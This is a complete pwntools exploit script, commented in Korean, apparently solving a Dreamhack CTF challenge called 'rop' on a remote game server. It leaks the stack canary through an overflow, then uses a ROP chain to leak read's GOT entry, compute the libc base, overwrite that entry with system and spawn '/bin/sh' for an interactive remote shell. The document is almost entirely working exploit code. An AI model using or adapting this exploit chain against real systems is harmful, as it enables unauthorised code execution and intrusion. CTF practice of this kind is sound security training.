from pwn import *		
context.arch='amd64'
context.log_level='debug'
#p = process('./rop')
p=remote('host3.dreamhack.games',10774)		
e = ELF('./rop')	
libc = ELF('./libc.so.6')
read_system=libc.symbols["read"] - libc.symbols["system"]	

#logging func
def slog(name, addr): return success(': '.join([name, hex(addr)]))		

# [1] Leak canary
buf = b'A' * 0x39		
p.sendafter(b'Buf: ', buf)		
p.recvuntil(buf)		
cnry = u64(b'\x00' + p.recvn(7))		
slog('canary', cnry)

# [2] Exploit
read_plt = e.plt['read'] #read함수 plt
read_got = e.got['read'] #read함수 got
write_plt=e.plt['write'] #write함수 plt
pop_rdi = 0x0000000000400853 #pop rdi; ret 가젯	
pop_rsi_r15 = 0x0000000000400851 #pop rsi; pop r15; ret; 가젯
ret=0x0000000000400854
#system 함수 주소 없음, 매개변수에 필요한 "/bin/sh" 문자열도 없음		
#system 함수는 libc.so.6에 정의, 여기에는 read,puts,printf도 있음
#system 함수는 호출 되지 않아서 GOT에 주소가 저장되어 있지 않지만, read,puts,printf는 등록되어 있음
#read나 printf 함수를 GOT에 등록되어 있고, image base는 달라지지만, offset은
#바뀌지 않음으로, system 함수의 주소를 read의 got 주소에서 offset을 빼서
#이미지 베이스의 주소를 구하고 system의 주소를 얻을 수 있음
#system = read-0xc3c20
#"/bin/sh" 문자열은 libc.so.6에 존재
payload = b'A'*0x38 + p64(cnry) + b'B'*0x8	

# read_got주소 출력
# write(fd,buf,n) : write(rdi,rsi,r15)
# write(1 ,read_got, ...) 
payload += p64(pop_rdi) + p64(1) # pop rdi => rdi=1		
payload += p64(pop_rsi_r15)+p64(read_got) + p64(0) # pop rsi => rsi= read_got, pop r15 => 0
payload += p64(write_plt) # write(rdi,rsi,r15) => write(1,read_got,0) ; read함수의 got주소 출력

# read_got 주소를 system 주소로 overwrite
# read(fd,buf,n) : read(rdi,rsi,rdx)
# read(0,read_got, ...) 입력스트림, 입력 버퍼, 입력길이
payload +=p64(pop_rdi) + p64(0)
payload +=p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload +=p64(read_plt)

# read ('/bin/sh') == system("/bin/sh")
# read_plt는 기존 주소가 아닌 overwrite된 system함수를 참조하게됨
payload+=p64(pop_rdi)
payload+=p64(read_got+0x8)
payload+=p64(ret)
payload +=p64(read_plt)

p.sendafter(b'Buf: ', payload)		
read = u64(p.recvn(6) + b'\x00'*2) # get read_got address
lb=read -libc.symbols['read'] # 라이브러리 주소(이미지 베이스) => got주소(실제주소) - 심볼(offset)
system = lb + libc.symbols['system'] # 시스템 주소 => 이미지 베이스 + 시스템 심볼

p.send(p64(system) + b'/bin/sh\x00')
p.interactive()
